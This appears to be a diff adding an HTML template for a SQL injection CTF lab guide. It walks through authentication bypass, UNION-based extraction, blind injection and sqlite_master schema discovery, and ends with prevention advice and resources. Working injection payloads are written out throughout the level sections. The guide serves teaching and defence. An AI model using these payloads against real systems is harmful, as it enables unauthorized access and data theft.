@@ -1,0 +1,319 @@
+{% extends "base.html" %}
+
+{% block title %}CTF Guide - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="guide-container">
+    <div class="guide-header">
+        <h1><i class="fas fa-book"></i> SQL Injection CTF Guide</h1>
+        <p>Complete guide to mastering SQL injection techniques</p>
+    </div>
+
+    <div class="guide-content">
+        <div class="guide-nav">
+            <h3>Quick Navigation</h3>
+            <ul>
+                <li><a href="#introduction">Introduction</a></li>
+                <li><a href="#level1-guide">Level 1: Auth Bypass</a></li>
+                <li><a href="#level2-guide">Level 2: Data Extraction</a></li>
+                <li><a href="#level3-guide">Level 3: Blind Injection</a></li>
+                <li><a href="#level4-guide">Level 4: Schema Discovery</a></li>
+                <li><a href="#prevention">Prevention</a></li>
+                <li><a href="#resources">Resources</a></li>
+            </ul>
+        </div>
+
+        <div class="guide-sections">
+            <section id="introduction" class="guide-section">
+                <h2><i class="fas fa-info-circle"></i> Introduction to SQL Injection</h2>
+                <p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.</p>
+                
+                <div class="info-box">
+                    <h4>What you'll learn:</h4>
+                    <ul>
+                        <li>Basic SQL injection techniques</li>
+                        <li>UNION-based data extraction</li>
+                        <li>Blind injection methods</li>
+                        <li>Database schema discovery</li>
+                        <li>Prevention techniques</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Important Notice</h4>
+                    <p>This lab is for educational purposes only. Never attempt SQL injection on systems you don't own or without explicit permission.</p>
+                </div>
+            </section>
+
+            <section id="level1-guide" class="guide-section">
+                <h2><i class="fas fa-unlock"></i> Level 1: Authentication Bypass</h2>
+                
+                <h3>Objective</h3>
+                <p>Bypass the login authentication without knowing valid credentials.</p>
+
+                <h3>Vulnerable Code</h3>
+                <div class="code-block">
+                    <code class="sql">SELECT * FROM users WHERE username = '{input}' AND password = '{input}'</code>
+                </div>
+
+                <h3>Attack Technique</h3>
+                <p>Use SQL comments and OR conditions to make the WHERE clause always true:</p>
+
+                <div class="example-box">
+                    <h4>Example Payloads:</h4>
+                    <ul>
+                        <li><code>admin' OR '1'='1' --</code> - Classic OR injection</li>
+                        <li><code>admin'--</code> - Comment out password check</li>
+                        <li><code>' OR 1=1 --</code> - Universal bypass</li>
+                    </ul>
+                </div>
+
+                <h3>How it Works</h3>
+                <p>The payload <code>admin' OR '1'='1' --</code> transforms the query to:</p>
+                <div class="code-block">
+                    <code class="sql">SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'</code>
+                </div>
+                <p>Since '1'='1' is always true and the password check is commented out, the query returns results.</p>
+            </section>
+
+            <section id="level2-guide" class="guide-section">
+                <h2><i class="fas fa-database"></i> Level 2: UNION SELECT Data Extraction</h2>
+                
+                <h3>Objective</h3>
+                <p>Extract sensitive data from other database tables using UNION SELECT.</p>
+
+                <h3>UNION Requirements</h3>
+                <ol>
+                    <li>Same number of columns in both SELECT statements</li>
+                    <li>Compatible data types</li>
+                    <li>Knowledge of table and column names</li>
+                </ol>
+
+                <h3>Step-by-Step Process</h3>
+                
+                <h4>1. Determine Column Count</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT NULL,NULL,NULL,NULL,NULL --</code>
+                </div>
+
+                <h4>2. Find String Columns</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT 'test',NULL,NULL,NULL,NULL --</code>
+                </div>
+
+                <h4>3. Extract Data</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT secret_name,secret_value,'','','' FROM secrets --</code>
+                </div>
+
+                <div class="tip-box">
+                    <h4><i class="fas fa-lightbulb"></i> Pro Tip</h4>
+                    <p>Use ORDER BY to determine column count: <code>' ORDER BY 5 --</code></p>
+                </div>
+            </section>
+
+            <section id="level3-guide" class="guide-section">
+                <h2><i class="fas fa-clock"></i> Level 3: Time-based Blind Injection</h2>
+                
+                <h3>Objective</h3>
+                <p>Extract data when no direct output is visible, using time delays.</p>
+
+                <h3>When to Use Blind Injection</h3>
+                <ul>
+                    <li>Application doesn't show database errors</li>
+                    <li>No visible output from queries</li>
+                    <li>Need to extract data character by character</li>
+                </ul>
+
+                <h3>Time-based Technique</h3>
+                <p>Use conditional statements that cause delays when conditions are true:</p>
+
+                <div class="example-box">
+                    <h4>Basic Time Delay:</h4>
+                    <code>admin' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --</code>
+                    
+                    <h4>Conditional Extraction:</h4>
+                    <code>admin' AND (SELECT CASE WHEN SUBSTR((SELECT secret_value FROM secrets LIMIT 1),1,1)='C' THEN (SELECT COUNT(*) FROM users) ELSE 0 END) --</code>
+                </div>
+
+                <h3>Automation Strategy</h3>
+                <ol>
+                    <li>Test each character position</li>
+                    <li>Try each possible character (A-Z, 0-9, symbols)</li>
+                    <li>Measure response time</li>
+                    <li>Build the extracted string character by character</li>
+                </ol>
+            </section>
+
+            <section id="level4-guide" class="guide-section">
+                <h2><i class="fas fa-search"></i> Level 4: Advanced Schema Discovery</h2>
+                
+                <h3>Objective</h3>
+                <p>Discover hidden database tables and extract sensitive administrative data.</p>
+
+                <h3>Schema Discovery Techniques</h3>
+                
+                <h4>1. Discover All Tables</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT name,'table' FROM sqlite_master WHERE type='table' --</code>
+                </div>
+
+                <h4>2. Get Table Structure</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT sql,'schema' FROM sqlite_master WHERE name='admin_users' --</code>
+                </div>
+
+                <h4>3. Extract from Hidden Tables</h4>
+                <div class="code-block">
+                    <code>' UNION SELECT admin_name,secret_data FROM admin_users --</code>
+                </div>
+
+                <div class="database-schema">
+                    <h4>Database Schema Reference</h4>
+                    <table class="schema-table">
+                        <thead>
+                            <tr>
+                                <th>Table</th>
+                                <th>Key Columns</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>users</td>
+                                <td>username, password, email</td>
+                                <td>Regular user accounts</td>
+                            </tr>
+                            <tr>
+                                <td>admin_users</td>
+                                <td>admin_name, admin_pass, secret_data</td>
+                                <td>Administrative accounts</td>
+                            </tr>
+                            <tr>
+                                <td>secrets</td>
+                                <td>secret_name, secret_value</td>
+                                <td>Hidden flags and data</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <section id="prevention" class="guide-section">
+                <h2><i class="fas fa-shield-alt"></i> Prevention Techniques</h2>
+                
+                <h3>1. Parameterized Queries (Prepared Statements)</h3>
+                <div class="code-block">
+                    <code class="python">
+# Vulnerable
+query = f"SELECT * FROM users WHERE username = '{username}'"
+
+# Secure
+cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+                    </code>
+                </div>
+
+                <h3>2. Input Validation</h3>
+                <ul>
+                    <li>Whitelist allowed characters</li>
+                    <li>Validate data types and formats</li>
+                    <li>Limit input length</li>
+                    <li>Escape special characters</li>
+                </ul>
+
+                <h3>3. Least Privilege Principle</h3>
+                <ul>
+                    <li>Use database accounts with minimal permissions</li>
+                    <li>Avoid using database admin accounts in applications</li>
+                    <li>Implement database-level access controls</li>
+                </ul>
+
+                <h3>4. Error Handling</h3>
+                <ul>
+                    <li>Don't expose database errors to users</li>
+                    <li>Log errors securely for debugging</li>
+                    <li>Use generic error messages</li>
+                </ul>
+
+                <h3>5. Web Application Firewall (WAF)</h3>
+                <ul>
+                    <li>Filter malicious SQL patterns</li>
+                    <li>Monitor and alert on injection attempts</li>
+                    <li>Rate limit requests</li>
+                </ul>
+            </section>
+
+            <section id="resources" class="guide-section">
+                <h2><i class="fas fa-external-link-alt"></i> Additional Resources</h2>
+                
+                <h3>Documentation</h3>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Tutorial</a></li>
+                    <li><a href="https://www.w3schools.com/sql/sql_injection.asp" target="_blank">W3Schools SQL Injection</a></li>
+                </ul>
+
+                <h3>Tools</h3>
+                <ul>
+                    <li><strong>SQLMap</strong> - Automatic SQL injection tool</li>
+                    <li><strong>Burp Suite</strong> - Web application security testing</li>
+                    <li><strong>OWASP ZAP</strong> - Free security testing proxy</li>
+                </ul>
+
+                <h3>Practice Labs</h3>
+                <ul>
+                    <li>DVWA (Damn Vulnerable Web Application)</li>
+                    <li>SQLi Labs</li>
+                    <li>WebGoat</li>
+                    <li>HackTheBox Web Challenges</li>
+                </ul>
+            </section>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+// Smooth scrolling for navigation links
+document.querySelectorAll('.guide-nav a').forEach(link => {
+    link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const targetId = this.getAttribute('href').substring(1);
+        const targetElement = document.getElementById(targetId);
+        
+        if (targetElement) {
+            targetElement.scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+    });
+});
+
+// Highlight current section in navigation
+function updateActiveSection() {
+    const sections = document.querySelectorAll('.guide-section');
+    const navLinks = document.querySelectorAll('.guide-nav a');
+    
+    let currentSection = '';
+    
+    sections.forEach(section => {
+        const rect = section.getBoundingClientRect();
+        if (rect.top <= 100 && rect.bottom >= 100) {
+            currentSection = section.id;
+        }
+    });
+    
+    navLinks.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('href') === '#' + currentSection) {
+            link.classList.add('active');
+        }
+    });
+}
+
+window.addEventListener('scroll', updateActiveSection);
+document.addEventListener('DOMContentLoaded', updateActiveSection);
+</script>
+{% endblock %}
